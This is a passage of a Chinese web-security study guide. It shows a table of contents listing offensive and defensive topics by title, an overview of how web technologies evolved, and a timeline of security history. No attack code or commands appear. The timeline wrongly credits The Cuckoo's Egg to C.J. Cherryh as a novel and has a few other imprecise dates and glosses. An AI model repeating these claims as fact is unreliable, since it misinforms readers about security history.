

<!DOCTYPE html>
<!--[if IE 8]><html class="no-js lt-ie9" lang="zh" > <![endif]-->
<!--[if gt IE 8]><!--> <html class="no-js" lang="zh" > <!--<![endif]-->
<head>
  <meta charset="utf-8">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <title>Web安全学习笔记 1.0 文档</title>
  

  
  
  
  

  
  <script type="text/javascript" src="static/js/modernizr.min.js"></script>
  
    
      <script type="text/javascript" id="documentation_options" data-url_root="./" src="static/documentation_options.js"></script>
        <script type="text/javascript" src="static/jquery.js"></script>
        <script type="text/javascript" src="static/underscore.js"></script>
        <script type="text/javascript" src="static/doctools.js"></script>
        <script type="text/javascript" src="static/language_data.js"></script>
    
    <script type="text/javascript" src="static/js/theme.js"></script>

    

  
  <link rel="stylesheet" href="static/css/theme.css" type="text/css" />
  <link rel="stylesheet" href="static/pygments.css" type="text/css" />
  <link rel="stylesheet" href="static/css/theme.css" type="text/css" />
    <link rel="index" title="索引" href="genindex.html" />
    <link rel="search" title="搜索" href="search.html" /> 
</head>

<body class="wy-body-for-nav">

   
  <div class="wy-grid-for-nav">
    
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
          

          
            <a href="index.html#document-index" class="icon icon-home"> Web安全学习笔记
          

          
          </a>

          
            
            
            
              <div class="version">
                latest
              </div>
            
          

          
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>

          
        </div>

        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
          
            
            
            
              <!-- Local TOC -->
              <div class="local-toc"><p class="caption"><span class="caption-text">内容索引:</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-basic/index">1. 序章</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-basic/history">1.1. Web技术演化</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-basic/atkhistory">1.2. 网络攻防技术演化</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-basic/outlook">1.3. 网络安全观</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-network/index">2. 计算机网络与协议</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/basic">2.1. 网络基础</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/udp">2.2. UDP协议</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/tcp">2.3. TCP协议</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/dhcp">2.4. DHCP协议</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/route">2.5. 路由算法</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/domain">2.6. 域名系统</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/http/index">2.7. HTTP协议簇</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/mail">2.8. 邮件协议族</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/ssl">2.9. SSL/TLS</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/ipsec">2.10. IPsec</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-network/wifi">2.11. Wi-Fi</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-info/index">3. 信息收集</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/network">3.1. 网络入口/信息</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/domain">3.2. 域名信息</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/port">3.3. 端口信息</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/site">3.4. 站点信息</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/searchEngine">3.5. 搜索引擎利用</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/social">3.6. 社会工程学</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-info/ref">3.7. 参考链接</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-vuln/index">4. 常见漏洞攻防</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/sql/index">4.1. SQL注入</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/xss/index">4.2. XSS</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/csrf">4.3. CSRF</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/ssrf">4.4. SSRF</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/cmdinjection">4.5. 命令注入</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/pathtraversal">4.6. 目录穿越</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/fileread">4.7. 文件读取</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/fileupload">4.8. 文件上传</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/fileinclude">4.9. 文件包含</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/xxe">4.10. XXE</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/ssti">4.11. 模版注入</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/xpath">4.12. Xpath注入</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/logic">4.13. 逻辑漏洞 / 业务漏洞</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/config">4.14. 配置安全</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/middleware/index">4.15. 中间件</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/webcache">4.16. Web Cache欺骗攻击</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-vuln/httpSmuggling">4.17. HTTP 请求走私</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-language/index">5. 语言与框架</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/php/index">5.1. PHP</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/python/index">5.2. Python</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/java/index">5.3. Java</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/javascript/index">5.4. JavaScript</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/golang">5.5. Golang</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/ruby">5.6. Ruby</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/asp">5.7. ASP</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/powershell">5.8. PowerShell</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/shell">5.9. Shell</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-language/csharp/index">5.10. CSharp</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-intranet/index">6. 内网渗透</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/windows">6.1. 信息收集 - Windows</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/winpersistence">6.2. 持久化 - Windows</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/wintrace">6.3. 痕迹清理 - Windows</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/domain">6.4. 域渗透</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/linux">6.5. 信息收集 - Linux</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/linuxpersistence">6.6. 持久化 - Linux</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/linuxtrace">6.7. 痕迹清理 - Linux</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/trojan">6.8. 后门技术</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/misc">6.9. 综合技巧</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-intranet/ref">6.10. 参考链接</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-defense/index">7. 防御技术</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/team">7.1. 团队建设</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/redteam">7.2. 红蓝对抗</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/sdl">7.3. 安全开发</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/secops">7.4. 安全建设</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/threat">7.5. 威胁情报</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/att8ck">7.6. ​​ATT&amp;CK</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/riskcontrol">7.7. 风险控制</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/framework">7.8. 防御框架</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/reinforce">7.9. 加固检查</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/intrusiondetection">7.10. 入侵检测</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/zt">7.11. 零信任安全</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/honeypot">7.12. 蜜罐技术</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/rasp">7.13. RASP</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/emergency">7.14. 应急响应</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-defense/forensic">7.15. 溯源分析</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-auth/index">8. 认证机制</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/sso">8.1. SSO</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/jwt">8.2. JWT</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/oauth">8.3. OAuth</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/saml">8.4. SAML</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/windows">8.5. Windows</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/kerberos">8.6. Kerberos</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-auth/ntlm">8.7. NTLM 身份验证</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-tools/index">9. 工具与资源</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/resource">9.1. 推荐资源</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/papers">9.2. 相关论文</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/info">9.3. 信息收集</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/socialengineering">9.4. 社会工程学</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/fuzz">9.5. 模糊测试</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/exploit">9.6. 漏洞利用/检测</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/nearsource">9.7. 近源渗透</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/webpersistence">9.8. Web持久化</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/intranet">9.9. 横向移动</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/ospersistence">9.10. 操作系统持久化</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/aduit">9.11. 审计工具</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/defense">9.12. 防御</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/sdl">9.13. 安全开发</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/operation">9.14. 运维</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-tools/misc">9.15. 其他</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-manual/index">10. 手册速查</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-manual/brute">10.1. 爆破工具</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-manual/download">10.2. 下载工具</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-manual/traffic">10.3. 流量相关</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-manual/sniffing">10.4. 嗅探工具</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-manual/sqlmap">10.5. SQLMap使用</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="index.html#document-misc/index">11. 其他</a><ul>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/aduit">11.1. 代码审计</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/waf">11.2. WAF</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/netdev">11.3. 常见网络设备</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/unicode">11.4. Unicode</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/dos">11.5. 拒绝服务攻击</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/docker">11.6. Docker</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/apt">11.7. APT</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/nearsource">11.8. 近源渗透</a></li>
<li class="toctree-l2"><a class="reference internal" href="index.html#document-misc/terminology">11.9. 常见术语</a></li>
</ul>
</li>
</ul>
</div>
            
          
        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">

      
      <nav class="wy-nav-top" aria-label="top navigation">
        
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="index.html#document-index">Web安全学习笔记</a>
        
      </nav>


      <div class="wy-nav-content">
        
        <div class="rst-content">
        
          















<div role="navigation" aria-label="breadcrumbs navigation">

  <ul class="wy-breadcrumbs">
    
      <li><a href="index.html#document-index">Docs</a> &raquo;</li>
        
      <li>Web安全学习笔记 1.0 文档</li>
    
    
      <li class="wy-breadcrumbs-aside">
        
            
            
              <a href="https://github.com/LyleMi/Learn-Web-Hacking/blob/master/source/index.rst" class="fa fa-github"> Edit on GitHub</a>
            
          
        
      </li>
    
  </ul>

  
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
            
  <div class="section" id="web">
<h1>Web安全学习笔记<a class="headerlink" href="#web" title="永久链接至标题">¶</a></h1>
<div class="toctree-wrapper compound">
<span id="document-basic/index"></span><div class="section" id="id1">
<h2>序章<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
<div class="toctree-wrapper compound">
<span id="document-basic/history"></span><div class="section" id="web">
<h3>Web技术演化<a class="headerlink" href="#web" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简单网站<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>静态页面<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>Web技术在最初阶段，网站的主要内容是静态的，大多站点托管在ISP上，由文字和图片组成，制作和表现形式也是以表格为主。当时的用户行为也非常简单，基本只是浏览网页。</p>
</div>
<div class="section" id="id3">
<h5>多媒体阶段<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>随着技术的不断发展，音频、视频、Flash等多媒体技术诞生了。多媒体的加入使得网页变得更加生动形象，网页上的交互也给用户带来了更好的体验。</p>
</div>
<div class="section" id="cgi">
<h5>CGI阶段<a class="headerlink" href="#cgi" title="永久链接至标题">¶</a></h5>
<p>渐渐的，多媒体已经不能满足人们的请求，于是CGI (Common Gateway Interface) 应运而生。CGI定义了Web服务器与外部应用程序之间的通信接口标准，因此Web服务器可以通过CGI执行外部程序，让外部程序根据Web请求内容生成动态的内容。</p>
<p>在这个时候，各种编程语言如PHP/ASP/JSP也逐渐加入市场，基于这些语言可以实现更加模块化的、功能更强大的应用程序。</p>
</div>
<div class="section" id="ajax">
<h5>Ajax<a class="headerlink" href="#ajax" title="永久链接至标题">¶</a></h5>
<p>在开始的时候，用户提交整个表单后才能获取结果，用户体验极差。于是Ajax (Asynchronous Javascript And XML) 技术逐渐流行起来，它使得应用在不更新整个页面的前提下也可以获得或更新数据。这使得Web应用程序更为迅捷地回应用户动作，并避免了在网络上发送那些没有改变的信息。</p>
</div>
<div class="section" id="mvc">
<h5>MVC<a class="headerlink" href="#mvc" title="永久链接至标题">¶</a></h5>
<p>随着Web应用开发越来越标准化，出现了MVC等思想。MVC是Model/View/Control的缩写，Model用于封装数据和数据处理方法，视图View是数据的HTML展现，控制器Controller负责响应请求，协调Model和View。</p>
<p>Model，View和Controller的分开，是一种典型的关注点分离的思想，使得代码复用性和组织性更好，Web应用的配置性和灵活性也越来越好。而数据访问也逐渐通过面向对象的方式来替代直接的SQL访问，出现了ORM (Object Relation Mapping) 的概念。</p>
<p>除了MVC，类似的设计思想还有MVP，MVVM等。</p>
</div>
</div>
<div class="section" id="id4">
<h4>数据交互<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<div class="section" id="id5">
<h5>简单数据交互<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h5>
<p>在Web技术发展最初，前后端交互大部分都使用Web表单、XML、SOAP等较为简单的方式。</p>
</div>
<div class="section" id="restful">
<h5>RESTful<a class="headerlink" href="#restful" title="永久链接至标题">¶</a></h5>
<p>在CGI时期，前后端通常是没有做严格区分的，随着解耦和的需求不断增加，前后端的概念开始变得清晰。前端主要指网站前台部分，运行在PC端、移动端等浏览器上展现给用户浏览的网页，由HTML5、CSS3、JavaScript组成。后端主要指网站的逻辑部分，涉及数据的增删改查等。</p>
<p>此时，REST (Representation State Transformation) 逐渐成为一种流行的Web架构风格。</p>
<p>REST鼓励基于URL来组织系统功能，充分利用HTTP本身的语义，而不是仅仅将HTTP作为一种远程数据传输协议。一般RESTful有以下的特征：</p>
<ul class="simple">
<li><dl class="first docutils">
<dt>域名和主域名分开</dt>
<dd><ul class="first last">
<li>api.example.com</li>
<li>example.com/api/</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>带有版本控制</dt>
<dd><ul class="first last">
<li>api.example.com/v1</li>
<li>api.example.com/v2</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>使用URL定位资源</dt>
<dd><ul class="first last">
<li>GET /users 获取所有用户</li>
<li>GET /team/:team/users 获取某团队所有用户</li>
<li>POST /users 创建用户</li>
<li>PATCH/PUT /users 修改某个用户数据</li>
<li>DELETE /users 删除某个用户数据</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>用 HTTP 动词描述操作</dt>
<dd><ul class="first last">
<li>GET   获取资源，单个或多个</li>
<li>POST  创建资源</li>
<li>PUT/PATCH 更新资源，客户端提供完整的资源数据</li>
<li>DELETE    删除资源</li>
</ul>
</dd>
</dl>
</li>
<li><dl class="first docutils">
<dt>正确使用状态码</dt>
<dd><ul class="first last">
<li>使用状态码提高返回数据的可读性</li>
</ul>
</dd>
</dl>
</li>
<li>默认使用 JSON 作为数据响应格式</li>
<li>有清晰的文档</li>
</ul>
</div>
<div class="section" id="graphql">
<h5>GraphQL<a class="headerlink" href="#graphql" title="永久链接至标题">¶</a></h5>
<p>部分网络服务场景的数据有复杂的依赖关系，为了应对这些场景，Facebook 推出了 GraphQL ，以图状数据结构对数据进行查询存储。部分网站也应用了 GraphQL 作为 API 交互的方式。</p>
</div>
<div class="section" id="id6">
<h5>二进制<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>随着业务对性能的要求提高，前后端开始使用HTTP/2、自定义Protocol Buffer等方式来加快数据交互。</p>
</div>
</div>
<div class="section" id="id7">
<h4>中间件<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h4>
<div class="section" id="id8">
<h5>架构复杂化<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h5>
<p>随着业务的不断发展，业务架构也越来越复杂。传统的功能被拆分成不同的模块，出现了中间件、中台等概念。代理服务、负载均衡、数据库分表、异地容灾、缓存、CDN、消息队列、安全防护等技术应用越来越广泛，增加了Web开发和运维的复杂度。</p>
<p>客户端的形态越来越多，除了Web之外iOS、Android等其他场景也出现在Web服务的客户端场景。</p>
<p>数据库从最开始的轻量数据库，出现了Redis/Memcached缓存数据库等一类满足特定需求的数据库。</p>
<p>为了满足特定的业务需求，出现了Lucene/Solr/Elasticsearch搜索应用服务器，Kafka/RabbitMQ/ZeroMQ消息系统，Spark计算引擎，Hive数据仓库平台等不同的基础架构。</p>
</div>
<div class="section" id="id9">
<h5>分布式<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<p>随着数据量的不断提高，单台设备难以承载这样的访问量，同时不同功能也被拆分到不同的应用中，于是出现了提高业务复用及整合的分布式服务框架(RPC)。</p>
</div>
<div class="section" id="ci-cd">
<h5>CI/CD<a class="headerlink" href="#ci-cd" title="永久链接至标题">¶</a></h5>
<p>持续集成 (Continuous Integration, CI) 是让开发人员将工作集成到共享分支中的过程。频繁的集成有助于解决隔离，减少每次提交的大小，以降低合并冲突的可能性。</p>
<p>持续交付 (Continuous Deployment, CD) 是持续集成的扩展，它将构建从集成测试套件部署到预生产环境。这使得它可以直接在类生产环境中评估每个构建，因此开发人员可以在无需增加任何工作量的情况下，验证bug修复或者测试新特性。</p>
</div>
</div>
<div class="section" id="id10">
<h4>云服务<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h4>
<p>云计算诞生之前，大部分计算资源是处于“裸金属”状态的物理机，运维人员选择对应规格的硬件，建设机房的 IDC 网络，完成服务的提供，投入硬件基础建设和维护的成本很高。云服务出现之后，使用者可以直接购买云主机，基础设施由供应商管理，这种方式也被称作 IaaS (Infrastructure-as-a-Service) 。</p>
<p>随着架构的继续发展，应用的运行更加细粒度，部署环境容器化，各个功能拆成微服务或是Serverless的架构。</p>
<div class="section" id="serverless">
<h5>Serverless<a class="headerlink" href="#serverless" title="永久链接至标题">¶</a></h5>
<p>Serverless 架构由两部分组成，即 Faas (Function-as-a-Service)  和 BaaS (Backend-as-a-Service) 。</p>
<p>FaaS是运行平台，用户上传需要执行的逻辑函数如一些定时任务、数据处理任务等到云函数平台，配置执行条件触发器、路由等等，就可以通过云平台完成函数的执行。</p>
<p>BaaS包含了后端服务组件，它基于 API 完成第三方服务，主要是数据库、对象存储、消息队列、日志服务等等。</p>
</div>
<div class="section" id="id11">
<h5>微服务<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h5>
<p>微服务起源于2005年Peter Rodgers博士在云端运算博览会提出的微Web服务 (Micro-Web-Service)，根本思想类似于Unix的管道设计理念。2014年，由Martin Fowler与 James Lewis共同提出了微服务的概念，定义了微服务架构风格是一种通过一套小型服务来开发单个应用的方法，每个服务运行在自己的进程中，并通过轻量级的机制进行通讯 (HTTP API) 。</p>
<p>微服务是一种应用于组件设计和部署架构的软件架构风格。它利用模块化的方式组合出复杂的大型应用程序：</p>
<ul class="simple">
<li>各个服务功能内聚，实现与接口分离。</li>
<li>各个服务高度自治、相互解耦，可以独立进行部署、版本控制和容量伸缩。</li>
<li>各个服务之间通过 API 的方式进行通信。</li>
<li>各个服务拥有独立的状态，并且只能通过服务本身来对其进行访问。</li>
</ul>
</div>
<div class="section" id="api">
<h5>API网关<a class="headerlink" href="#api" title="永久链接至标题">¶</a></h5>
<p>API网关是一个服务器，客户端只需要使用简单的访问方式，统一访问API网关，由API网关来代理对后端服务的访问，同时由于服务治理特性统一放到API网关上面，服务治理特性的变更可以做到对客户端透明，一定程度上实现了服务治理等基础特性和业务服务的解耦，服务治理特性的升级也比较容易实现。</p>
</div>
</div>
<div class="section" id="id12">
<h4>参考链接<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://arcentry.com/blog/scaling-webapps-for-newbs-and-non-techies/">Scaling webapps for newbs</a></li>
<li><a class="reference external" href="https://learnku.com/articles/24050">GitHub 的 Restful HTTP API 设计分解</a></li>
</ul>
</div>
</div>
<span id="document-basic/atkhistory"></span><div class="section" id="id1">
<h3>网络攻防技术演化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>历史发展<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>1939年，图灵破解了Enigma，使战争提前结束了两年，这是较早的一次计算机安全开始出现在人们的视野中，这个时候计算机的算力有限，人们使用的攻防方式也相对初级。</p>
<p>1949年，约翰·冯·诺依曼（John Von Neumann）提出了一种可自我复制的程序的设计，这被认为是世界上第一种计算机病毒。</p>
<p>1970年到2009年间，随着因特网不断发展，网络安全也开始进入人们的视野。在网络发展的初期，很多系统都是零防护的，安全意识也尚未普及开来。很多系统的设计也只考虑了可用性，对安全性的考虑不多，所以在当时结合搜索引擎与一些集成渗透测试工具，可以很容易的拿到数据或者权限。</p>
<p>1972年，缓冲区溢出攻击被 Computer Security Technology Planning Study 提出。</p>
<p>1984年，Ken Thompson 在 Reflections on Trusting Trust 一文中介绍了自己如何在编译器中增加后门来获取 Unix 权限的，这也是较早的供应链攻击。</p>
<p>1988年，卡耐基梅隆大学(Carnegie Mellon University, CMU)的一位学生以测试的目的编写了Morris Worm，对当时的互联网造成了极大的损害。</p>
<p>同年，CMU的CERT Coordination Center (CERT-CC)为了处理Morris Worm对互联网造成的破坏，组成了第一个计算机紧急响应小组(Computer Emergency Response Team)，而后全球多个国家、地区、团体都构建了CERT、SRC等组织。</p>
<p>同样是在1988年，Barton Miller教授在威斯康星大学的 <a class="reference external" href="http://pages.cs.wisc.edu/~bart/fuzz/CS736-Projects-f1988.pdf">计算机实验课上</a> ，首次提出Fuzz生成器(Fuzz Generator)的概念，用于测试Unix程序的健壮性，即用随机数据来测试程序直至崩溃。因此，Barton Miller教授也被多数人尊称为&quot;模糊测试之父&quot;。</p>
<p>1989年，C.J.Cherryh 发表了小说 The Cuckoo's Egg: Tracking a Spy Through the Maze of Computer Espionage ，这本书是作者根据追溯黑客攻击的真实经历改编，在书中提出了蜜罐技术的雏形。</p>
<p>1990年，一些网络防火墙的产品开始出现，此时主要是基于网络的防火墙，可以处理FTP等应用程序。</p>
<p>1993年起，Jeff Moss开始每年在美国内华达州的拉斯维加斯举办 DEFCON (也写做 DEF CON, Defcon, or DC, 全球最大的计算机安全会议之一) 。CTF (Capture The Flag) 比赛的形式也是起源于1996年的 DEFCON 。</p>
<p>1993年7月，Windows NT 3.1发布，引入了身份认证、访问控制和安全审计等安全控制机制，在此之前的 Windows 9x 内核几乎没有任何安全性机制。</p>
<p>1996年，Smashing the Stack For Fun and Profit发表，在堆栈的缓冲区溢出的利用方式上做出了开创性的工作。</p>
<p>1997年起，Jeff Moss开始举办 Black Hat ，以中立的立场进行信息安全研究的交流和培训，到目前为止，Black Hat 也会在欧洲和亚洲举行。</p>
<p>1998年12月，Jeff Forristal在一篇 <a class="reference external" href="http://www.phrack.com/issues.html?issue=54&amp;id=8">文章</a> 中提到了使用SQL注入的技巧攻击一个网站的例子，从此SQL注入开始被广泛讨论。</p>
<p>1999年1月21日-22日的第二届 Research with Security Vulnerability Databases 的 WorkShop 上， MITRE 的创始人 David E. Mann 和 Steven M. Christey 发表了一篇名为《Towards a Common Enumeration of Vulnerabilities》的白皮书，提出了CVE (Common Vulnerabilities and Exposures, 通用漏洞披露) 的概念，在当年收录并公开了321个CVE漏洞。</p>
<p>1999年12月，MSRC的一些工程师发现了一些网站被注入代码的例子，他们在整理讨论后公开了这种攻击，并称为 Cross Site Scripting。</p>
<p>2002年1月，Microsoft发起了 “可信赖计算” (Trustworthy Computing) 计划，以帮助确保产品和服务在本质上具有高度安全性，可用性，可靠性以及业务完整性，SDL (Security Development Lifecycle) 也在此时被提出。</p>
<p>2001年9月9日，Mark Curphey启动了OWASP (Open Web Application Security Project) 项目，开始在社区中提供一些Web攻击技术的文章、方法和工具等。</p>
<p>在此之后，Responsible disclosure / Full disclosure 等概念也不断进入人们的视野之中。</p>
<p>2002年10月4日，Kevin Mitnick 编著的 The Art of Deception (欺骗的艺术) 出版，这本书详细的介绍了社会工程学在攻击中是如何应用的，Kevin Mitnick 也被认为是社会工程学的开山鼻祖。</p>
<p>2005年7月25日，Zero Day Initiative (ZDI) 创建，鼓励负责任的漏洞披露。</p>
<p>2005年11月，基于从1941年2月开始的情报收集积累和发展，Director of National Intelligence 宣布成立 Open Source Center (OSC) ，进行开源情报的收集，而后 Open-source intelligence (OSINT) 的概念也不断被人们认知。</p>
<p>2006年，APT(Advanced Persistent Threat, 高级持续威胁) 攻击的概念被正式提出，用来描述从20世纪90年代末到21世纪初在美国军事和政府网络中发现的隐蔽且持续的网络攻击。</p>
<p>2006年起，美国国土安全部（DHS）开始每两年举行一次 “网络风暴” (Cyber Storm) 系列国家级网络事件演习。</p>
